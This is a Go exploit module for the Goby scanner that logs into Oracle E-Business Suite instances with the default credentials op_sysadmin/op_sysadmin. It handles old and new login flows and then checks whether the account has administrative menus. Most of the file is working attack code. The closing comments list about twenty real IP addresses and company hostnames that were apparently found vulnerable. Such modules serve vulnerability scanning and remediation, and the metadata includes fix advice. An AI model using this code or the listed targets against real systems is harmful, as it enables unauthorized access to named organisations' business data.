package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Oracle E-Business Suite default password vulnerability",
    "Description": "<p>Oracle E-Business Suite is a software package that allows organizations or companies to manage key business processes. It includes the more common Oracle Enterprise Resource Planning (ERP), Oracle Applications, Oracle Applications, Oracle Finance, e-Biz and EBS (electronics Business suite).</p><p>Oracle E-Business Suite has a default password vulnerability.Attackers can log in to the platform with the default password op_sysadmin/op_sysadmin, and use the administrator authority to operate the core functions.</p>",
    "Product": "Oracle E-Business Suite",
    "Homepage": "https://www.oracle.com/applications/ebusiness/",
    "DisclosureDate": "2021-11-22",
    "Author": "",
    "FofaQuery": "title=\"E-Business Suite\"",
    "GobyQuery": "title=\"E-Business Suite\"",
    "Level": "2",
    "Impact": "<p>Attackers can log in to the platform with the default password op_sysadmin/op_sysadmin, and use the administrator authority to operate the core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If it is not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://cxsecurity.com/issue/WLB-2020030106"
    ],
    "Is0day": false,
    "Translation": {
        "EN": {
            "Name": "Oracle E-Business Suite default password vulnerability",
            "Product": "Oracle E-Business Suite",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ],
            "Description": "<p>Oracle E-Business Suite is a software package that allows organizations or companies to manage key business processes. It includes the more common Oracle Enterprise Resource Planning (ERP), Oracle Applications, Oracle Applications, Oracle Finance, e-Biz and EBS (electronics Business suite).</p><p>Oracle E-Business Suite has a default password vulnerability.Attackers can log in to the platform with the default password op_sysadmin/op_sysadmin, and use the administrator authority to operate the core functions.</p>",
            "Impact": "<p>Attackers can log in to the platform with the default password op_sysadmin/op_sysadmin, and use the administrator authority to operate the core functions.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If it is not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>"
        }
    },
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10222"
}`


	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),
		expJson,

		//这里面有若干地址都存在此问题，因为没在官方找到相关默认账户的详细说明，就找了一定数量的测试地址验证：http://121.40.47.194/oracle-ebs-default-account.txt
		//用户名密码均为 op_sysadmin

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			targetUri := "/OA_HTML/AppsLogin" //该地址可以填写多个，因为GET请求模式下会跟随HTTP跳转，然后到达最终的登陆页面
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + targetUri); err == nil {
				parserCookies := func(setCookieText []string) string { //该函数用于解析响应头中的cookies信息并返回成字符串类型
					cookies := ""
					for _, cookieText := range setCookieText {
						cookies += cookieText[:strings.Index(cookieText, ";")+1]
					}
					return cookies
				}
				if strings.Contains(resp.RawBody, "?function_id=") { //旧版EBS登录
					// 开始模拟旧版本EBS登录
					// 为防止出现"function_id"参数值不同的情况，需要事先获取
					// 需要先在不跟随"/OA_HTML/AppsLocalLogin.jsp"跳转的情况下获取到funtion_id
					functionIDLogin := httpclient.NewPostRequestConfig("/OA_HTML/AppsLocalLogin.jsp")
					functionIDLogin.FollowRedirect = false
					if functionIDResp, functionIDErr := httpclient.DoHttpRequest(u, functionIDLogin); functionIDErr == nil {
						regFunctionID := regexp.MustCompile(`/OA_HTML/RF\.jsp\?function_id=(?s:(.*?))&`)
						resultFunctionID := regFunctionID.FindAllStringSubmatch(functionIDResp.RawBody, -1)
						oldVersionUri := "/OA_HTML/RF.jsp?function_id=" + resultFunctionID[0][1][:len(resultFunctionID[0][1])]
						if oldVersionCookieSteam, cookieSteamErr := httpclient.SimpleGet(u.FixedHostInfo + oldVersionUri); cookieSteamErr == nil {
							regActionUri := regexp.MustCompile(`<form(?s:(.*?))action="(?s:(.*?))"`) //正则获取登入时的POST地址
							//正则获取"hidden"属性的输入框值
							regInputValue := regexp.MustCompile(`<input(?s:(.*?))type="hidden" value="(?s:(.*?))"(?s:(.*?))name="(?s:(.*?))"(?s:(.*?))>`)
							//正则获取提交按钮的flag，必须存在，否则在旧版EBS登录时报错
							regButtonValue := regexp.MustCompile(`submitForm\('DefaultFormName',1,\{'_FORM_SUBMIT_BUTTON':'(?s:(.*?))'}\);return false`)
							resultActionUri := regActionUri.FindAllStringSubmatch(oldVersionCookieSteam.RawBody, -1)
							resultInputValue := regInputValue.FindAllStringSubmatch(oldVersionCookieSteam.RawBody, -1)
							resultButtonValue := regButtonValue.FindAllStringSubmatch(oldVersionCookieSteam.RawBody, -1)
							ebsCredentials := "usernameField=op_sysadmin&passwordField=op_sysadmin"
							oldVersionEBSLogin := httpclient.NewPostRequestConfig(resultActionUri[0][2])
							for _, inputValue := range resultInputValue {
								oldVersionEBSLogin.Data += inputValue[4] + "=" + inputValue[2] + "&" //拼接网页中的请求参数组成body
							}
							oldVersionEBSLogin.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							oldVersionEBSLogin.Header.Store("Cookie", parserCookies(oldVersionCookieSteam.Header["Set-Cookie"])) //已经获取到cookies
							oldVersionEBSLogin.VerifyTls = false
							oldVersionEBSLogin.FollowRedirect = false
							oldVersionEBSLogin.Data += ebsCredentials + "&_FORM_SUBMIT_BUTTON=" + resultButtonValue[0][1]
							if loginResp, loginErr := httpclient.DoHttpRequest(u, oldVersionEBSLogin); loginErr == nil {
								if loginResp.StatusCode == 302 && strings.Contains(loginResp.RawBody, "OA.jsp?OAFunc=") {
									return true //登录成功后，会发生跳转
								}
							}
						}
					}
				} else { //新版EBS登录
					//开始模拟新版EBS登录
					newVersionUri := "/OA_HTML/AppsLocalLogin.jsp?"
					newVersionLogin := httpclient.NewPostRequestConfig(newVersionUri)
					newVersionLogin.Header.Store("X-Service", "AuthenticateUser")
					newVersionLogin.Header.Store("Content-type", "application/x-www-form-urlencoded")
					newVersionLogin.VerifyTls = false
					newVersionLogin.FollowRedirect = false
					newVersionLogin.Data = "username=op_sysadmin&password=op_sysadmin"
					if loginResp, loginErr := httpclient.DoHttpRequest(u, newVersionLogin); loginErr == nil {
						ss.VulURL = "Oracle EBS://op_sysadmin:op_sysadmin@" + u.HostInfo + "/OA_HTML/AppsLogin"
						if loginResp.StatusCode == 200 && strings.Contains(loginResp.RawBody, "status: 'success'") {
							return true //新版EBS登入成功之后，会返回”status: 'success'“字段
						}
					}
				}
			}
			return false
		},


		//因为对应默认口令登入系统之后，需要在安装对应Java JNLP/EXE客户端脚本才能访问对应的系统功能点，GOBY漏洞框架不方便模拟，故漏洞验证部分的逻辑就是登陆系统之后判断当前账号是否存在管辖菜单。有些场景登进去之后账号没有被划分到对应的操作菜单，危害会较低。
		//因为不知道怎么在POC和EXP函数中传递信息，因此利用阶段又模拟了一次登录
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//————————————————————————————————————————————————————————————————————————————————————————
			targetUri := "/OA_HTML/AppsLogin"
			if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + targetUri); err == nil {
				parserCookies := func(setCookieText []string) string {
					cookies := ""
					for _, cookieText := range setCookieText {
						cookies += cookieText[:strings.Index(cookieText, ";")+1]
					}
					return cookies
				}
				if strings.Contains(resp.RawBody, "?function_id=") { //旧版EBS登录
					functionIDLogin := httpclient.NewPostRequestConfig("/OA_HTML/AppsLocalLogin.jsp")
					functionIDLogin.FollowRedirect = false
					if functionIDResp, functionIDErr := httpclient.DoHttpRequest(expResult.HostInfo, functionIDLogin); functionIDErr == nil {

						regFunctionID := regexp.MustCompile(`/OA_HTML/RF\.jsp\?function_id=(?s:(.*?))&`)
						resultFunctionID := regFunctionID.FindAllStringSubmatch(functionIDResp.RawBody, -1)
						oldVersionUri := "/OA_HTML/RF.jsp?function_id=" + resultFunctionID[0][1][:len(resultFunctionID[0][1])]
						if oldVersionCookieSteam, cookieSteamErr := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + oldVersionUri); cookieSteamErr == nil {
							regActionUri := regexp.MustCompile(`<form(?s:(.*?))action="(?s:(.*?))"`) //正则获取登入时的POST地址
							regInputValue := regexp.MustCompile(`<input(?s:(.*?))type="hidden" value="(?s:(.*?))"(?s:(.*?))name="(?s:(.*?))"(?s:(.*?))>`)
							regButtonValue := regexp.MustCompile(`submitForm\('DefaultFormName',1,\{'_FORM_SUBMIT_BUTTON':'(?s:(.*?))'}\);return false`)
							resultActionUri := regActionUri.FindAllStringSubmatch(oldVersionCookieSteam.RawBody, -1)
							resultInputValue := regInputValue.FindAllStringSubmatch(oldVersionCookieSteam.RawBody, -1)
							resultButtonValue := regButtonValue.FindAllStringSubmatch(oldVersionCookieSteam.RawBody, -1)
							ebsCredentials := "usernameField=op_sysadmin&passwordField=op_sysadmin"
							oldVersionEBSLogin := httpclient.NewPostRequestConfig(resultActionUri[0][2])
							for _, inputValue := range resultInputValue {
								oldVersionEBSLogin.Data += inputValue[4] + "=" + inputValue[2] + "&" //拼接网页中的请求参数组成body
							}
							oldVersionEBSLogin.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							oldVersionEBSLogin.Header.Store("Cookie", parserCookies(oldVersionCookieSteam.Header["Set-Cookie"])) //已经获取到cookies
							oldVersionEBSLogin.VerifyTls = false
							oldVersionEBSLogin.FollowRedirect = false
							oldVersionEBSLogin.Data += ebsCredentials + "&_FORM_SUBMIT_BUTTON=" + resultButtonValue[0][1]
							if loginResp, loginErr := httpclient.DoHttpRequest(expResult.HostInfo, oldVersionEBSLogin); loginErr == nil {
								if loginResp.StatusCode == 302 && strings.Contains(loginResp.RawBody, "OA.jsp?OAFunc=") {
									expResult.Success = true
									//旧版EBS登陆成功后，判断是否当前存在管理菜单
									appsLocalLoginCookies := parserCookies(loginResp.Header["Set-Cookie"])
									oAFuncLogin := httpclient.NewGetRequestConfig("/OA_HTML/OA.jsp?OAFunc=OANEWHOMEPAGE")
									oAFuncLogin.Header.Store("Cookie", appsLocalLoginCookies)
									if oAFuncResp, oAFuncErr := httpclient.DoHttpRequest(expResult.HostInfo, oAFuncLogin); oAFuncErr == nil {
										oAFuncLoginCookies := parserCookies(oAFuncResp.Header["Set-Cookie"])
										checkPermissionBody := "<params><param>RESPLIST</param><param>HOMEPAGE</param></params>"
										checkPermissionLogin := httpclient.NewPostRequestConfig("/OA_HTML/RF.jsp?function_id=MAINMENUREST&security_group_id=0")
										checkPermissionLogin.Header.Store("Content-type", "application/xml")
										checkPermissionLogin.Header.Store("Cookie", appsLocalLoginCookies+oAFuncLoginCookies)
										checkPermissionLogin.Data = checkPermissionBody
										if checkPermissionResp, checkPermissionErr := httpclient.DoHttpRequest(expResult.HostInfo, checkPermissionLogin); checkPermissionErr == nil {
											expResult.Success = true
											if strings.Contains(checkPermissionResp.RawBody, "<RESPNAME>") {
												expResult.Output = "The corresponding function menu exists for this account! You need to log on to download the corresponding JNLP/EXE script for access. Username and password are 'op_sysadmin'"
											} else {
												expResult.Output = "The corresponding function menu does not exist for this account! Username and password are 'op_sysadmin'"
											}
										}
									}
								}
							}
						} //!
					}
				} else {
					newVersionUri := "/OA_HTML/AppsLocalLogin.jsp?"
					newVersionLogin := httpclient.NewPostRequestConfig(newVersionUri)
					newVersionLogin.Header.Store("X-Service", "AuthenticateUser")
					newVersionLogin.Header.Store("Content-type", "application/x-www-form-urlencoded")
					newVersionLogin.FollowRedirect = true
					newVersionLogin.Data = "username=op_sysadmin&password=op_sysadmin"
					if loginResp, loginErr := httpclient.DoHttpRequest(expResult.HostInfo, newVersionLogin); loginErr == nil {
						if loginResp.StatusCode == 200 && strings.Contains(loginResp.RawBody, "status: 'success'") {
							//新版EBS登录成功后，判断是否当前存在管理菜单
							appsLocalLoginCookies := parserCookies(loginResp.Header["Set-Cookie"])
							oAFuncLogin := httpclient.NewGetRequestConfig("/OA_HTML/OA.jsp?OAFunc=OANEWHOMEPAGE")
							oAFuncLogin.Header.Store("Cookie", appsLocalLoginCookies)
							if oAFuncResp, oAFuncErr := httpclient.DoHttpRequest(expResult.HostInfo, oAFuncLogin); oAFuncErr == nil {
								oAFuncLoginCookies := parserCookies(oAFuncResp.Header["Set-Cookie"])
								checkPermissionBody := "<params><param>RESPLIST</param><param>HOMEPAGE</param></params>"
								checkPermissionLogin := httpclient.NewPostRequestConfig("/OA_HTML/RF.jsp?function_id=MAINMENUREST&security_group_id=0")
								checkPermissionLogin.Header.Store("Content-type", "application/xml")
								checkPermissionLogin.Header.Store("Cookie", appsLocalLoginCookies+oAFuncLoginCookies)
								checkPermissionLogin.Data = checkPermissionBody
								if checkPermissionResp, checkPermissionErr := httpclient.DoHttpRequest(expResult.HostInfo, checkPermissionLogin); checkPermissionErr == nil {
									expResult.Success = true
									if strings.Contains(checkPermissionResp.RawBody, "<RESPNAME>") {
										expResult.Output = "The corresponding function menu exists for this account! You need to log on to download the corresponding JNLP/EXE script for access. Username and password are 'op_sysadmin'"
									} else {
										expResult.Output = "The corresponding function menu does not exist for this account! Username and password are 'op_sysadmin'"
									}
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}


//https://98.158.84.93
//https://66.162.61.254
//https://150.204.209.20
//https://133.254.5.42
//https://72.165.204.126
//https://132.145.251.14
//http://15.206.198.14:8010
//http://65.163.6.194
//https://i-pride.kenya-airways.com
//https://isupplier-sei.elkay.com
//http://tracking.mitsuifoods.com
//http://52.116.35.74
//http://66.179.175.254
//http://58.63.109.10:8060
//https://erpprodext.hrsd.com
//https://crp4quote.a10networks.com
//http://erpapps.htcc.com.sa:8000
//https://fmis-core.railway.co.th:4443
//http://erpapp.bibica.com.vn:8000
//https://ebsapp.wuyang-honda.com:8000

//rate:20%
